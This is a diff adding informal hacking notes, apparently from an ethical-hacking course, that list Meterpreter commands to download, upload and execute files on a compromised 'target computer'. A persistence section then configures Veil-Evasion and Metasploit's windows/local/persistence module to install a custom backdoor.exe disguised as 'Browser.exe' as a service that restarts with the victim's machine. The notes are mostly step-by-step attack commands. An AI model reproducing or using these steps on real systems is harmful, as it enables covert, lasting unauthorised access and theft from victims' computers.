@@ -1,0 +1,19 @@
+After gaining access to the target computer we can \
+->dowload any of the file from target computer to our computer using " download [file_name] "
+-?upload a particular file into the target computer'upload [file_name] "
+-> execute the uploaded file in the target computer " execute -f [file_name] "
+
+05. Maintaining Access (Persistence)
+
+Whenver the target user switches off their computer,our backdoor also gets terminated.Hence , we need to run our backdoor as a service so that it gets turned on whenevr the target system is also turned on
+This can be done by veil-evasion ->> list ->> use (service_no)5
+else
+
+backgrond current session 
+use exploit/windoes/local/persistence 
+show options
+set EXE_NAME Browser.exe
+set SESSION 1
+show advanced options 
+set EXE::custom /var/www/html/backdoor.exe (run a custom exe to run and imject into the target as a service)
+
